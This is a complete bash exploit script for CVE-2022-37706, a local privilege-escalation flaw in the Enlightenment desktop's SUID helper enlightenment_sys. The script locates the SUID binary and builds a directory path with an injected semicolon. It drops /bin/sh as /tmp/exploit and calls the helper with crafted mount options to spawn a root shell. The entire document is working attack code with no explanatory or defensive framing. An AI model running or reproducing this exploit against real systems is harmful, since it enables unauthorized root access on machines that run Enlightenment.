#!/bin/bash

# Colors for better output visualization
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
NC="\033[0m" # No color

echo -e "${YELLOW}========================="
echo -e "   CVE-2022-37706 Exploit"
echo -e "=========================${NC}"

# Start message
echo -e "${YELLOW}[*] Searching for the vulnerable SUID file...${NC}"
echo -e "${YELLOW}[*] This may take a few seconds...${NC}"

# Search for the vulnerable file
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)

# Check if the file was found
if [[ -z ${file} ]]; then
    echo -e "${RED}[-] Could not find the vulnerable SUID file.${NC}"
    echo -e "${YELLOW}[*] Make sure Enlightenment is installed on your system.${NC}"
    exit 1
fi

# Vulnerable file found
echo -e "${GREEN}[+] Vulnerable SUID file found: ${file}${NC}"
echo -e "${YELLOW}[*] Attempting to pop a root shell...${NC}"

# Create temporary directories
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

# Create exploit
echo "/bin/sh" > /tmp/exploit
chmod +x /tmp/exploit

# Success message
echo -e "${GREEN}[+] Exploit prepared at /tmp/exploit${NC}"
echo -e "${GREEN}[+] Enjoy your root shell :)${NC}"

# Execute the vulnerable file with manipulated parameters
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
